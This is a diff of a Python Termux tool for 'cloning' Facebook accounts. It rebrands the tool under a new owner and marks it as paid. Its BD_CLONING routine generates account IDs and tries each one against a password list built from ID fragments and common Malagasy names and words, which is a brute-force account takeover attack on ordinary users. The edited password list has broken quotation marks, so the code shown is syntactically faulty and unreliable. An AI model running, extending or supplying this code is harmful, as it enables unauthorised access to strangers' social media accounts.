@@ -1,5 +1,5 @@
 # Définir le numéro de version
-version_actuelle = "1.5"
+version_actuelle = "5.0"
 
 
 
@@ -66,12 +66,11 @@ logo=(f'''{B}
                                             
 
 {warna}--------------------------------------------{B}
- Owner    : {M}CHRICE999{M}
- TOOL NAME : {warna}{P}NEIN{P}{warna}
- GROUPE-FB   : [TERMUX-COMAND]
- STATUE : {H}FREE{H}
- Facebook : {bblue}ITACHI SQ{bblue}
- Tools    : {warna}[{M}VERSION 1.5{warna}]{warna}
+ Owner    : {M}SAFIDY03{M}
+ TOOL NAME : {warna}{P}SAFIDY{P}{warna}
+ STATUE : {H}PAID{H}
+ Facebook : {bblue}SM{bblue}
+ Tools    : {warna}[{M}VERSION 5.0{warna}]{warna}
 --------------------------------------------{B}''')
 #-------------linex def -------------#
 def linex():
@@ -117,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nantenaina','Nantenaina','nomena','Nomena', 'rakoto', 'Rakoto', 'diamondra', 'Diamondra', 'fandresena', 'Fandresena', 'gerard', 'Gerard', 'mendrika', 'Mendrika', 'lalaina', 'Antananarivo', 'antananarivo', 'Lalaina', 'rakotomalala', 'Rakotomalala', 'rakotonirina','Rakotonirina','anthonio','Anthonio',','ferdinand','Ferdinand,'mahery,','Mahery','malagasy','Malagasy','mirah','Mirah','vololona','Vololona','nirina','Nirina','president','President','lalatiana','Lalatiana','mandresy','Mandresy','tsiresy','Tsiresy']
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' LE CLONING EST FINI ')
